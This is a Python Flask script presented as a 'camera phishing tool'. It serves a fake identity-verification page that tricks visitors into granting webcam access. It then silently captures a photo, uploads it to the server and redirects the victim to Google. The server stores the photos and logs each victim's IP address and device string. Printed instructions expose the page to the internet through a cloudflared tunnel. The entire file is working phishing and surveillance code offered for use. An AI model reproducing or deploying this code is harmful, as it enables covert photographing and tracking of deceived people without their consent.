import os
import threading
import base64
from flask import Flask, request, redirect
from datetime import datetime
from pyfiglet import figlet_format


R = '\033[91m'
G = '\033[92m'
Y = '\033[93m'
B = '\033[94m'
P = '\033[95m'
C = '\033[96m'
W = '\033[97m'
N = '\033[0m'


app = Flask(__name__)


clear = lambda: os.system('cls' if os.name == 'nt' else 'clear')


if not os.path.exists('captured_photos'):
    os.makedirs('captured_photos')


def show_banner():
    clear()
    banner = figlet_format("CAMERA PHISH")
    print(f"{R}{banner}{N}")
    print(f"{C}------------------------------------------------------------")
    print(f"{G}TEAM DARK | CAMERA PHISHING TOOL | @ᴺᴼ--N̶ᴀ̶ᴍ̶ᴇ̷")
    print(f"{C}------------------------------------------------------------{N}")


@app.route('/')
def index():
    return '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification Required</title>
    <style>
        body {
            background: #f0f2f5;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background: #fff;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 0 15px rgba(0,0,0,0.2);
            text-align: center;
            width: 90%;
            max-width: 400px;
            animation: fadeIn 1s ease-in-out;
        }
        @keyframes fadeIn {
            0% { opacity: 0; transform: translateY(-20px); }
            100% { opacity: 1; transform: translateY(0); }
        }
        h2 {
            color: #333;
            margin-bottom: 20px;
        }
        p {
            color: #666;
            margin-bottom: 20px;
        }
        video, canvas {
            display: none;
        }
        button {
            padding: 10px 20px;
            background: #4285f4;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: background 0.3s;
        }
        button:hover {
            background: #3267d6;
        }
        .secure-text {
            font-size: 12px;
            color: #888;
            margin-top: 15px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Verification Required</h2>
        <p>Please allow camera access to verify your identity.</p>
        <video id="video" width="320" height="240" autoplay></video>
        <canvas id="canvas" width="320" height="240"></canvas>
        <button onclick="capturePhoto()">Allow Camera</button>
        <div class="secure-text">🔒 Secure Connection</div>
        <script>
            async function capturePhoto() {
                const video = document.getElementById('video');
                const canvas = document.getElementById('canvas');
                const context = canvas.getContext('2d');

                // Request camera access
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                    video.srcObject = stream;
                    setTimeout(() => {
                        context.drawImage(video, 0, 0, 320, 240);
                        const dataUrl = canvas.toDataURL('image/png');
                        fetch('/capture', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ image: dataUrl })
                        }).then(() => {
                            stream.getTracks().forEach(track => track.stop());
                            window.location.href = 'https://www.google.com';
                        });
                    }, 1000);
                } catch (err) {
                    alert('Camera access denied or not available.');
                }
            }
        </script>
    </div>
</body>
</html>
'''


@app.route('/capture', methods=['POST'])
def capture():
    data = request.get_json()
    image_data = data['image'].split(',')[1]
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    photo_path = f'captured_photos/photo_{timestamp}.png'
    with open(photo_path, 'wb') as f:
        f.write(base64.b64decode(image_data))
    ip_address = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'Unknown')
    log = f"[+] [{datetime.now()}] Photo Captured | IP: {ip_address} | Device: {user_agent} | Path: {photo_path}\n"
    print(f"{G}{log}{N}")
    with open('camera_log.txt', 'a') as f:
        f.write(log)
    return 'Captured'


def main():
    show_banner()
    port = 5000
    print(f"{Y}Launching phishing page on port: {port}{N}")
    print(f"{G}Run in new session:{N}")
    print(f"{C}cloudflared tunnel --url http://localhost:{port}{N}")
    print(f"{Y}Waiting for camera access... CTRL+C to stop.{N}")
    threading.Thread(target=app.run, args=('0.0.0.0', port)).start()

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"{R}\n[!] Exiting...{N}")
        exit()